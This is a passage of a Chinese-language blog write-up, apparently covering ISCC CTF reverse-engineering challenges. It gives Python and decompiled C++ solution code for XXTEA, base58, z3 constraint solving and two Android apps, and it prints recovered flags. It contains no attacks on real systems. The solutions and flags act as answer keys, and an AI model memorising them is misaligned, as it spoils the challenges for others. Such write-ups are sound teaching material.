class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2u</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(x &gt;=<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    maxint = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> maxint + (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) + x +<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_encode</span>(<span class="params">plain, key, delta</span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(plain)</span><br><span class="line">    rounds = <span class="number">52</span> // Len + <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[ind] = u2i(plain[ind])</span><br><span class="line">    rnd_key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>):</span><br><span class="line">        rnd_key = rnd_key - delta</span><br><span class="line">        e = rnd_key &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, Len):</span><br><span class="line">            lst_chr = plain[(ind-<span class="number">1</span>) % Len]</span><br><span class="line">            cipher_ind_nxt = plain[(ind + <span class="number">1</span>) % Len]</span><br><span class="line">            adv = ( ( ((cipher_ind_nxt&lt;&lt;<span class="number">2</span>)^(lst_chr&gt;&gt;<span class="number">5</span>)) + ((cipher_ind_nxt&gt;&gt;<span class="number">3</span>)^(lst_chr&lt;&lt;<span class="number">4</span>)) ) ^ ( (cipher_ind_nxt^rnd_key) + (lst_chr ^ key[e ^ ind &amp; <span class="number">3</span>]) ) )</span><br><span class="line">            plain[ind] = u2i(plain[ind] + adv)</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_decode</span>(<span class="params">cipher, key, delta</span>):</span></span><br><span class="line">    Len = <span class="built_in">len</span>(cipher)</span><br><span class="line">    rounds = <span class="number">52</span> // Len + <span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        cipher[ind] = u2i(cipher[ind])</span><br><span class="line"></span><br><span class="line">    rnd_key = <span class="number">0</span></span><br><span class="line">    rev_rnd_keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        rnd_key -= delta</span><br><span class="line">        rnd_key = int32(rnd_key)</span><br><span class="line">        rev_rnd_keys.append(rnd_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>):</span><br><span class="line">        rnd_key = rev_rnd_keys[rounds-<span class="number">1</span>]</span><br><span class="line">        e = rnd_key &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        lst_chr = cipher[Len - <span class="number">1</span> - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(Len - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            lst_chr = cipher[(ind-<span class="number">1</span>) % Len]</span><br><span class="line">            cipher_ind_nxt = cipher[(ind + <span class="number">1</span>) % Len]</span><br><span class="line">            adv = ( ( ((cipher_ind_nxt&lt;&lt;<span class="number">2</span>)^(lst_chr&gt;&gt;<span class="number">5</span>)) + ((cipher_ind_nxt&gt;&gt;<span class="number">3</span>)^(lst_chr&lt;&lt;<span class="number">4</span>)) ) ^ ( (cipher_ind_nxt^rnd_key) + (lst_chr ^ key[e ^ ind &amp; <span class="number">3</span>]) ) )</span><br><span class="line">            cipher[ind] = u2i(cipher[ind] - adv)</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">p = [<span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x7b</span>, <span class="number">0x48</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x4b</span>, <span class="number">0x45</span>, <span class="number">0x39</span>, <span class="number">0x55</span>, <span class="number">0x6f</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x66</span>, <span class="number">0x71</span>, <span class="number">0x7d</span>]</span><br><span class="line">c = [<span class="number">0xE891B209</span>,<span class="number">0x7CE53269</span>,<span class="number">0x5DD21C21</span>,<span class="number">0x7C10247C</span>,<span class="number">0x6599594B</span>,<span class="number">0x32781574</span>,<span class="number">0xE603D667</span>,<span class="number">0x1D26D9D6</span>,<span class="number">0x272CC7E6</span>,<span class="number">0x15AEA474</span>,<span class="number">0xCA4C71B9</span>,<span class="number">0x3379CCA</span>,<span class="number">0x9A77F1D5</span>,<span class="number">0x7B643B55</span>,<span class="number">0x7F6A71F8</span>,<span class="number">0x3CB1D0C4</span>,<span class="number">0x6BFA1C52</span>,<span class="number">0xCAD81CB3</span>]</span><br><span class="line">k = [<span class="number">73</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>]</span><br><span class="line">d = <span class="number">0x61C88647</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ci = xxtea_encode(p, k, d)</span></span><br><span class="line">pi = xxtea_decode(c, k, d)</span><br></pre></td></tr></table></figure><h1 id="GetTheTable"><a href="#GetTheTable" class="headerlink" title="GetTheTable"></a>GetTheTable</h1><p>老实说没有分析出来加密过程，可能是IDA反编译有点儿问题，伪代码的逻辑和base58的算法有点儿区别。<br>不过既然都看到base58算法了不妨直接试一下，发现这里直接按照base58的逻辑写脚本就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">strr = <span class="string">&quot;ERaQux2mPMMXfoiML7guVUsB3a&quot;</span></span><br><span class="line">alphaTb = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">    enc.append(alphaTb.index(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span>*<span class="number">58</span> + i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">sum</span> &gt; <span class="number">0</span>):</span><br><span class="line">    res = <span class="built_in">sum</span> % <span class="number">256</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> // <span class="number">256</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(flag[ind], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Sad-Code"><a href="#Sad-Code" class="headerlink" title="Sad_Code"></a>Sad_Code</h1><p>数学公式选用z3求解，动态跟一下就能得到大致的逻辑，总之就是做了些简单的char int ascii之间的变换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">int64x8_m1 = Int(<span class="string">&#x27;int64x8_m1&#x27;</span>)</span><br><span class="line">int64x8_0_ = Int(<span class="string">&#x27;int64x8_0_&#x27;</span>)</span><br><span class="line">int64x8_1_ = Int(<span class="string">&#x27;int64x8_1_&#x27;</span>)</span><br><span class="line">int64x8_2_ = Int(<span class="string">&#x27;int64x8_2_&#x27;</span>)</span><br><span class="line">int64x8_3_ = Int(<span class="string">&#x27;int64x8_3_&#x27;</span>)</span><br><span class="line">int64x8_4_ = Int(<span class="string">&#x27;int64x8_4_&#x27;</span>)</span><br><span class="line">int64x8_5_ = Int(<span class="string">&#x27;int64x8_5_&#x27;</span>)</span><br><span class="line">int64x8_6_ = Int(<span class="string">&#x27;int64x8_6_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add( int64x8_1_ + <span class="number">7</span> * int64x8_0_ - <span class="number">4</span> * int64x8_m1 - <span class="number">2</span> * int64x8_2_ == <span class="number">0x1EA758B03</span>  )</span><br><span class="line">s.add( <span class="number">5</span> * int64x8_2_ + <span class="number">3</span> * int64x8_1_ - int64x8_0_ - <span class="number">2</span> * int64x8_m1 == <span class="number">0x129F7B49D</span>  )</span><br><span class="line">s.add( <span class="number">2</span> * int64x8_0_ + <span class="number">8</span> * int64x8_2_ + <span class="number">10</span> * int64x8_m1 - <span class="number">5</span> * int64x8_1_ == <span class="number">0x4CC880F25</span>  )</span><br><span class="line">s.add( <span class="number">7</span> * int64x8_m1 + <span class="number">15</span> * int64x8_0_ - <span class="number">3</span> * int64x8_2_ - <span class="number">2</span> * int64x8_1_ == <span class="number">0x7D7E95653</span>   )</span><br><span class="line">s.add( <span class="number">15</span> * int64x8_3_ + <span class="number">35</span> * int64x8_6_ - int64x8_4_ - int64x8_5_ == <span class="number">0xFF2E49303</span>  )</span><br><span class="line">s.add( <span class="number">38</span> * int64x8_5_ + int64x8_3_ + int64x8_6_ - <span class="number">24</span> * int64x8_4_ == <span class="number">0x6C07DC086</span>  )</span><br><span class="line">s.add( <span class="number">38</span> * int64x8_4_ + <span class="number">32</span> * int64x8_3_ - int64x8_5_ - int64x8_6_ == <span class="number">0x14FD9518AB</span>  )</span><br><span class="line">s.add( int64x8_3_ + <span class="number">41</span> * int64x8_5_ - int64x8_4_ - <span class="number">25</span> * int64x8_6_ == <span class="number">0x5CC80CE4D</span>   )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s.check() == sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line">s = [<span class="number">1230193475</span>, <span class="number">2067875158</span>, <span class="number">1129599313</span>, <span class="number">1227706190</span>, <span class="number">1447708749</span>, <span class="number">1229073737</span>, <span class="number">1464097358</span>, <span class="number">1413631869</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">t=[]</span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span>):</span><br><span class="line">        t.append(<span class="built_in">chr</span>(i%<span class="number">256</span>))</span><br><span class="line">        i = i // <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(t[ind], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="mobileA"><a href="#mobileA" class="headerlink" title="mobileA"></a>mobileA</h1><p>flag分为两部分，一部分去验证AES，密钥、偏移和加密后的值都有，直接用工具解就好，解出来是<code>sadasfsdASDWFSASAFfasf_</code>。</p><p>第二部分先算MD5值，然后进行base64加密，接着通过一段算法去重排base64序列来检验，比较简单，逆出来得到md5值，然后找个在线工具解出来是<code>cat</code>。</p><p>ISCC{sadasfsdASDWFSASAFfasf_cat}</p><p><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><a href="https://cryptii.com/pipes/base64-to-hex">https://cryptii.com/pipes/base64-to-hex</a></p><h1 id="mobileB"><a href="#mobileB" class="headerlink" title="mobileB"></a>mobileB</h1><p>做完之后发现整体的加密逻辑还是比较简单的，但是做的时候就非常烧脑（做题太少，经验不够）。因为在核心的native函数中，反编译得到的代码并不是非常直观。主要的难点是符号很多，而且多次出现多个符号其实对应着同一个变量的情况。再加上涉及到自定义结构体的指针操作，给静态分析带来了较大的麻烦。</p><p>面对这样的问题，有两个要点。</p><ol><li>首先是不能半途而废，要抽丝剥茧，坚持不懈。（虽然有点儿喊口号之嫌，但确实是经验之谈）</li><li>其次是动静结合。如果实在看不出来某个变量的含义，可以动态分析去看它的值，然后猜测它的含义。如果实在看不出来某段代码的作用，比如行数较多的while和for循环体，可以先确定这段代码操作的主要数据对象，然后动态调试看看这段代码对数据对象产生了怎样的影响，进而推测这段代码的作用。</li></ol><h3 id="整体逻辑"><a href="#整体逻辑" class="headerlink" title="整体逻辑"></a>整体逻辑</h3><p>应用的加密分布在java和native两层中，可以描述成<code>JavaHash(JNIEncode(flag))=Hash</code>。Native层非常直接，经过检查并没有动态注册、init_array之类的操作，<code>stringFromJNI()</code>函数就是静态注册的。flag先被传进native计算，返回的字符串交给java函数计算hash值，然后判断是否与目标值相同。</p><h3 id="Java层"><a href="#Java层" class="headerlink" title="Java层"></a>Java层</h3><p>flag先Java层的加密函数看起来是个hash函数。对于从native返回得到的字符串，把其中的每个字符传进sum()函数计算一个数字，然后把所有数字转成字符串，加上’0’拼接起来，得到类似于<code>&quot;52405201052052301230540405120140305240&quot;</code>这样的hash值。</p><p>虽然sum()函数的递归逻辑相对烧脑，但是，如下面的函数截图所示，整个函数的缺陷是它的输入（即sum(0, chr, 0)）是有限的，或者说native返回的是个字符串，这也导致这个hash函数的输入是有限的。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220506233246.png" alt="image-20220506233246595" style="zoom:67%;" /><p>因此，遍历sum(0, chr, 0)的所有可能，得到映射表，然后递归求解native返回的字符串的具体值。</p><p>简单写个py代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;51234&quot;</span>:<span class="string">&quot;127&quot;</span>, <span class="string">&quot;1234&quot;</span>:<span class="string">&quot;126&quot;</span>, <span class="string">&quot;5234&quot;</span>:<span class="string">&quot;125&quot;</span>, <span class="string">&quot;234&quot;</span>:<span class="string">&quot;124&quot;</span>, <span class="string">&quot;5134&quot;</span>:<span class="string">&quot;123&quot;</span>, <span class="string">&quot;134&quot;</span>:<span class="string">&quot;122&quot;</span>, <span class="string">&quot;534&quot;</span>:<span class="string">&quot;121&quot;</span>, <span class="string">&quot;34&quot;</span>:<span class="string">&quot;120&quot;</span>, <span class="string">&quot;5124&quot;</span>:<span class="string">&quot;119&quot;</span>, <span class="string">&quot;124&quot;</span>:<span class="string">&quot;118&quot;</span>, <span class="string">&quot;524&quot;</span>:<span class="string">&quot;117&quot;</span>, <span class="string">&quot;24&quot;</span>:<span class="string">&quot;116&quot;</span>, <span class="string">&quot;514&quot;</span>:<span class="string">&quot;115&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;114&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;113&quot;</span>, <span class="string">&quot;4&quot;</span>:<span class="string">&quot;112&quot;</span>, <span class="string">&quot;5123&quot;</span>:<span class="string">&quot;111&quot;</span>, <span class="string">&quot;123&quot;</span>:<span class="string">&quot;110&quot;</span>, <span class="string">&quot;523&quot;</span>:<span class="string">&quot;109&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;108&quot;</span>, <span class="string">&quot;513&quot;</span>:<span class="string">&quot;107&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;106&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;105&quot;</span>, <span class="string">&quot;3&quot;</span>:<span class="string">&quot;104&quot;</span>, <span class="string">&quot;512&quot;</span>:<span class="string">&quot;103&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;102&quot;</span>, <span class="string">&quot;52&quot;</span>:<span class="string">&quot;101&quot;</span>, <span class="string">&quot;2&quot;</span>:<span class="string">&quot;100&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;99&quot;</span>, <span class="string">&quot;1&quot;</span>:<span class="string">&quot;98&quot;</span>, <span class="string">&quot;5&quot;</span>:<span class="string">&quot;97&quot;</span>&#125;</span><br><span class="line">aim = <span class="string">&quot;52405201052052301230540405120140305240&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">pos, path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(pos, path)</span></span><br><span class="line">    <span class="keyword">if</span>(pos &gt;= <span class="built_in">len</span>(aim)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span> , path)</span><br><span class="line">        ret = path.upper()</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, <span class="built_in">len</span>(aim) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(aim[pos:i] <span class="keyword">in</span> d <span class="keyword">and</span> aim[i]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            dfs(i+<span class="number">1</span>, path + <span class="built_in">chr</span>(<span class="built_in">int</span>(d[ aim[pos:i] ])) )</span><br><span class="line">        </span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># path: UEBEMNQPGRHU</span></span><br></pre></td></tr></table></figure><h3 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h3><h4 id="1-在内存空间中排布字符串"><a href="#1-在内存空间中排布字符串" class="headerlink" title="1 在内存空间中排布字符串"></a>1 在内存空间中排布字符串</h4><p>一瞬定位到关键函数myjni()。这里出题人应该是修改了basic_string()函数（感觉是，也可能是我不熟知的STL什么的），该函数接收一个字符串，并在目标地址处开辟3个int32。若设字符串长度为Len，则第一个int32为((Len+16)&amp;0xFFFFFFF0)+1，第二个int32存储Len，另外开辟一块空间存放字符串，把地址存放在第三个int32中。</p><p>这样一来，预设的12个字符串就对应着3x12个int32。再按照<code>[3, 12, 6, 8, 7, 2, 4, 11, 1, 5, 9, 10]</code>变换顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;flag1, flag);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)struct_3int, <span class="string">&quot;FIXBMTURVPYJGZOQNKASEWCHLD&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">12</span>], <span class="string">&quot;UVBXSAFJDGHICZOPQRWELKTMNY&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">24</span>], <span class="string">&quot;PZGNVYDEFIJCBKARLUQHMWXOST&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">36</span>], <span class="string">&quot;FBSPMACKDRQITWHZLJXYGENOUV&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">48</span>], <span class="string">&quot;DTINKLUJCOMEQRAPGSXYFZBHVW&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">60</span>], <span class="string">&quot;XAMTFIRBVHEJSCDYZPKLNQGUOW&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">72</span>], <span class="string">&quot;EVRYXJACTZGHWOPQSIBUMNDFLK&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">84</span>], <span class="string">&quot;VWQGHLZBJEUYFPCSTNIKAXMORD&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">96</span>], <span class="string">&quot;FJNVWSTDXYUKMBCZLIGOPEHAQR&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">108</span>], <span class="string">&quot;NSKBRTUZEJOPGIFXCDAVWQYLMH&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">120</span>], <span class="string">&quot;ASTKPZJDCLYMVHXBNWIUOQGREF&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">132</span>], <span class="string">&quot;LZWXEHIMFUOPKJGAYTNCBDRSQV&quot;</span>);</span><br><span class="line">temp_add3 = (<span class="keyword">int</span> *)temp;</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line"><span class="keyword">for</span> ( ind1 = <span class="number">0</span>; ind1 != <span class="number">12</span>; ++ind1 )</span><br><span class="line">&#123;</span><br><span class="line">    crt_ptr = (<span class="keyword">int</span> *)&amp;struct_3int[<span class="number">12</span> * adv[ind1] - <span class="number">12</span>];<span class="comment">// adv = [3, 12, 6, 8, 7, 2, 4, 11, 1, 5, 9, 10]</span></span><br><span class="line">    <span class="keyword">if</span> ( temp_add3 != crt_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        crt_str_ptr = (<span class="keyword">char</span> *)crt_ptr[<span class="number">2</span>];</span><br><span class="line">        crt_str_realLen = crt_ptr[<span class="number">1</span>];</span><br><span class="line">        crt_str_fLens = *(<span class="keyword">unsigned</span> __int8 *)crt_ptr;</span><br><span class="line">        <span class="keyword">if</span> ( (crt_str_fLens &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            crt_str_ptr = (<span class="keyword">char</span> *)crt_ptr + <span class="number">1</span>;</span><br><span class="line">            crt_str_realLen = crt_str_fLens &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::string::<span class="built_in">assign</span>((<span class="keyword">int</span>)temp_add3, (<span class="keyword">int</span>)crt_str_ptr, crt_str_realLen, (<span class="keyword">int</span>)crt_ptr + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    temp_add3 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-根据Flag左移字符串并取出aim数组"><a href="#2-根据Flag左移字符串并取出aim数组" class="headerlink" title="2 根据Flag左移字符串并取出aim数组"></a>2 根据Flag左移字符串并取出aim数组</h4><p>Flag为12个大写字母，枚举这12个字母，在对应序号的字符串中找到这个字母第一次出现的位置（对应的函数是memchr()），然后循环左移这个字符串，使得这个字母排在第一个，然后又去取出字符串此时下标为9的字母，用于组成aim字符串数组。</p><p>这里面的逻辑比较烧脑，原因就是前面提及的频繁出现多个符号对应同一个变量情况，以及指针操作。解决办法就是耐心分析+动静结合。遇到逻辑比较复杂的代码块理起来比较麻烦，就动态调试打上断点，去看这段代码对内存中的变量进行的怎么样的修改，大概就能猜出逻辑。对于v*这样的变量，一时看不出来含义，也可以动态调试去看运行时的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span 